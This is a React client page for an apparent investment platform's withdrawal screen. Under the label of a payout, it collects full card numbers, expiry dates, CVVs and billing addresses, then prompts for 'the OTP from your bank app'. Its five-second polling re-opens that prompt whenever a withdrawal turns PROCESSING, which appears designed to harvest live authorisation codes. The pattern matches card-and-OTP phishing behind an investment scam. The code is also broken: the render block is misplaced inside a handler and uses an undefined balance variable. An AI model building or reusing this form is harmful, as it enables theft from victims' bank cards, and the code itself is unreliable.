"use client"

import { useState, useEffect, useRef } from 'react'
import { api } from '@/lib/api'
import toast from 'react-hot-toast'
import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield } from 'lucide-react'
import Modal from '@/components/Modal'

const WITHDRAWAL_FEE_PERCENT = 0.02
const WITHDRAWAL_FEE_MIN = 1
const WITHDRAWAL_FEE_MAX = 5

const getWithdrawalFee = (amount: number): number => {
  const fee = amount * WITHDRAWAL_FEE_PERCENT
  return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
}

const formatCardNumber = (value: string) => {
  const numbers = value.replace(/\D/g, '').slice(0, 16)
  return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

const statusColors: Record<string, string> = {
  PROCESSING: 'bg-blue-50 text-blue-700 border border-blue-200',
  WITHDRAWAL_PENDING: 'bg-amber-50 text-amber-700 border border-amber-200',
  WITHDRAWN: 'bg-green-50 text-green-700 border border-green-200',
  REJECTED: 'bg-red-50 text-red-700 border border-red-200',
  default: 'bg-gray-50 text-gray-700 border border-gray-200',
}

export default function WithdrawalsPage() {
  const [withdrawals, setWithdrawals] = useState<any[]>([])
  const [investments, setInvestments] = useState<any[]>([])
  const [loading, setLoading] = useState(true)
  const [showForm, setShowForm] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showOTPModal, setShowOTPModal] = useState(false)
  const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
  const [otpCode, setOtpCode] = useState('')
  const [referralBalance, setReferralBalance] = useState(0)
  const [canWithdrawReferralRewards, setCanWithdrawReferralRewards] = useState(false)
  const [formData, setFormData] = useState({ balanceSource: 'INVESTMENT', investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '' })
  const hasPromptedOTP = useRef(false)

  useEffect(() => {
    fetchWithdrawals()
    const interval = setInterval(fetchWithdrawals, 5000)
    return () => clearInterval(interval)
  }, [])

  const fetchWithdrawals = async () => {
    try {
      const { data } = await api.get('withdrawals')
      setWithdrawals(data.data)

      // Only show OTP modal once, from form submission (not polling)
      if (!hasPromptedOTP.current) {
        const processing = data.data.find((w: any) => w.status === 'PROCESSING')
        if (processing) {
          hasPromptedOTP.current = true
          setPendingWithdrawalId(processing.id)
          setShowOTPModal(true)
        }
      }
    } catch (err) {
      toast.error('Failed to fetch withdrawals')
    } finally {
      setLoading(false)
    }
  }

  const fetchInvestments = async () => {
    try {
      const [investmentResponse, referralResponse] = await Promise.all([api.get('/investments'), api.get('/referrals')])
      setInvestments(investmentResponse.data.data)
      setReferralBalance(Number(referralResponse.data.data?.walletBalance || 0))
      setCanWithdrawReferralRewards(Boolean(referralResponse.data.data?.canWithdrawReferralRewards))
    } catch (err) {
      console.log(err)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const amount = Number(formData.amount)
    if (amount < 1) {
      toast.error('Amount must be at least $1')
      return
    }
    if (!formData.billingAddress || formData.billingAddress.length < 5) {
      toast.error('Billing address required')
      return
    }
    const fee = getWithdrawalFee(amount)
    const selectedInvestment = investments.find((investment: any) => investment.id === formData.investmentId)
    const sourceBalance = formData.balanceSource === 'REFERRAL' ? referralBalance : Number(selectedInvestment?.currentBalance || 0)
    const maxWithdrawable = sourceBalance - fee
    if (amount > maxWithdrawable) {
      toast.error(`Insufficient balance. Fee: $${fee.toFixed(2)}`)
      return
    }
    handleConfirm()
  }

  const handleConfirm = async () => {
    try {
      const payload = {
        ...(formData.balanceSource === 'INVESTMENT' ? { investmentId: formData.investmentId } : {}),
        balanceSource: formData.balanceSource,
        amount: Number(formData.amount),
        method: 'CARD' as const,
        cardNumber: formData.cardNumber.replace(/\s/g, ''),
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        billingAddress: formData.billingAddress,
      }
      const { data } = await api.post('withdrawals', payload)
      setShowForm(false)
      if (data.success && data.data?.id) {
        setPendingWithdrawalId(data.data.id)
        setShowOTPModal(true)
      }
      fetchWithdrawals()
    } catch (err: any) {
      toast.error(err.response?.data?.message || 'Failed')
    }
  }

  const handleSubmitOTP = async () => {
    if (!pendingWithdrawalId || !otpCode || otpCode.length < 4) {
      toast.error('Please enter valid OTP code')
      return
    }
    try {
      await api.put(`withdrawals/${pendingWithdrawalId}/otp`, { otpCode })
      setShowOTPModal(false)
      setShowSuccess(true)
      fetchWithdrawals()
    } catch (err: any) {
      toast.error(err.response?.data?.message || 'Invalid OTP')
    } finally {
      setOtpCode('')
    }

    return (
    <div>
      {showForm && (
        <form onSubmit={handleSubmit} className="rounded-2xl border bg-white p-6 shadow-lg mb-6">
          <h3 className="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-2">
            <CreditCard className="h-5 w-5 text-brand-blue" />
            Request Withdrawal
          </h3>
          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Withdrawal Source</label>
              <select
                value={formData.balanceSource}
                onChange={(e) => setFormData({ ...formData, balanceSource: e.target.value, investmentId: '' })}
                className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-gray-50"
              >
                <option value="INVESTMENT">Investment Balance</option>
                <option value="REFERRAL" disabled={!canWithdrawReferralRewards || referralBalance <= 0}>Referral Rewards — ${referralBalance.toLocaleString()}</option>
              </select>
              {!canWithdrawReferralRewards && referralBalance > 0 && (
                <p className="mt-1 text-xs text-amber-600">Referral rewards unlock after first confirmed package deposit</p>
              )}
            </div>
            {formData.balanceSource === 'INVESTMENT' && (
              <div>
                <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Select Investment</label>
                <select
                  value={formData.investmentId}
                  onChange={(e) => setFormData({ ...formData, investmentId: e.target.value })}
                  className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-white shadow-sm hover:border-gray-300 transition-colors"
                  required={formData.balanceSource === 'INVESTMENT'}
                >
                  <option value="" disabled>Select an investment...</option>
                  {investments.map((inv) => (
                    <option key={inv.id} value={inv.id}>
                      {inv.investmentId} — Balance: ${Number(inv.currentBalance).toLocaleString()}
                    </option>
                  ))}
                  {investments.length === 0 && (
                    <option value="" disabled>No investments available</option>
                  )}
                </select>
              </div>
            )}
            <div>
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Amount (USD)</label>
              <input
                type="number"
                min="1"
                value={formData.amount}
                onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                className="w-full rounded-lg border border-gray-200 px-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-gray-50"
                required
                placeholder="Enter amount"
              />
            </div>
            <div>
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Card Number</label>
              <div className="relative">
                <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formatCardNumber(formData.cardNumber)}
                  onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value).replace(/\s/g, '') })}
                  className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 font-mono bg-gray-50"
                  required
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                />
              </div>
            </div>
            <div>
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Cardholder Name</label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.cardholderName}
                  onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
                  className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-gray-50"
                  required
                  placeholder="John Doe"
                />
              </div>
            </div>
            <div>
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Expiry Date</label>
              <div className="relative">
                <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.expiryDate}
                  onChange={(e) => {
                    let v = e.target.value.replace(/\D/g, '')
                    if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4)
                    setFormData({ ...formData, expiryDate: v.slice(0, 5) })
                  }}
                  className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-gray-50"
                  required
                  placeholder="12/25"
                  maxLength={5}
                />
              </div>
            </div>
            <div>
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">CVV</label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.cvv}
                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
                  className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-gray-50"
                  required
                  placeholder="123"
                  maxLength={3}
                />
              </div>
            </div>
            <div className="sm:col-span-2">
              <label className="block text-xs font-medium text-gray-600 uppercase tracking-wide mb-1">Billing Address</label>
              <div className="relative">
                <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.billingAddress}
                  onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
                  className="w-full rounded-lg border border-gray-200 pl-10 pr-3 py-2 text-sm focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 bg-gray-50"
                  required
                  placeholder="Street, Apt, City, Country"
                />
              </div>
            </div>
          </div>
          <div className="mt-6 flex items-center justify-between">
            <p className="text-xs text-gray-500">
              Available: ${sourceBalance.toLocaleString()} | Fee: ${getWithdrawalFee(Number(formData.amount || 0)).toFixed(2)}
            </p>
          </div>
          <div className="mt-4 flex gap-3">
            <button
              type="submit"
              className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-brand-blue to-brand-sky px-4 py-2 text-sm font-semibold text-white hover:from-brand-blue/90 hover:to-brand-sky/90 focus:outline-none focus:ring-2 focus:ring-brand-blue focus:ring-offset-2 transition-all duration-200"
            >
              <ArrowUpRight className="h-4 w-4" />
              Request Withdrawal
            </button>
            <button
              type="button"
              onClick={() => setShowForm(false)}
              className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-200 transition-all duration-200"
            >
              Cancel
            </button>
          </div>
        </form>
      )}

      {showOTPModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
            <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
              <Shield className="h-5 w-5 text-brand-blue" />
              Enter OTP Code
            </h3>
            <p className="text-sm text-slate-700 mb-4">
              Please enter the OTP from your bank app to complete the withdrawal.
            </p>
            <input
              type="text"
              value={otpCode}
              onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 10))}
              className="w-full rounded-lg border border-gray-200 px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
              placeholder="Enter OTP code"
              maxLength={10}
            />
            <div className="mt-4 flex gap-3">
              <button
                onClick={handleSubmitOTP}
                className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-brand-blue to-brand-sky px-4 py-2 text-sm font-semibold text-white hover:from-brand-blue/90 hover:to-brand-sky/90 focus:outline-none focus:ring-2 focus:ring-brand-blue focus:ring-offset-2"
              >
                Verify & Complete
              </button>
              <button
                onClick={() => setShowOTPModal(false)}
                className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-200"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="rounded-2xl border bg-white overflow-hidden shadow-sm">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-gray-50">
              <tr className="border-b">
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wide">Date</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wide">Source</th>
                <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wide">Amount</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wide">Card</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wide">Status</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-100">
              {withdrawals.map((w) => (
                <tr key={w.id} className="hover:bg-gray-50 transition-colors">
                  <td className="px-4 py-3 text-sm text-gray-600">
                    {new Date(w.createdAt).toLocaleDateString()}
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-900">
                    {w.balanceSource === 'REFERRAL' ? 'Referral Rewards' : w.investmentId?.slice(0, 8) || '-'}
                  </td>
                  <td className="px-4 py-3 text-sm text-right font-medium text-gray-900">
                    ${Number(w.amount).toLocaleString()}
                  </td>
                  <td className="px-4 py-3 text-sm text-gray-600 font-mono">
                    {w.cardNumber ? `•••• ${formatCardNumber(w.cardNumber).split(' ').pop()}` : '-'}
                  </td>
                  <td className="px-4 py-3">
                    <span className={`inline-block rounded-full px-2.5 py-0.5 text-xs font-medium ${statusColors[w.status] || statusColors.default}`}>
                      {w.status.replace(/_/g, ' ')}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          {withdrawals.length === 0 && (
            <div className="p-8 text-center text-gray-500">
              <div className="flex flex-col items-center gap-2">
                <CreditCard className="h-8 w-8 text-gray-300" />
                <span>No withdrawals yet.</span>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
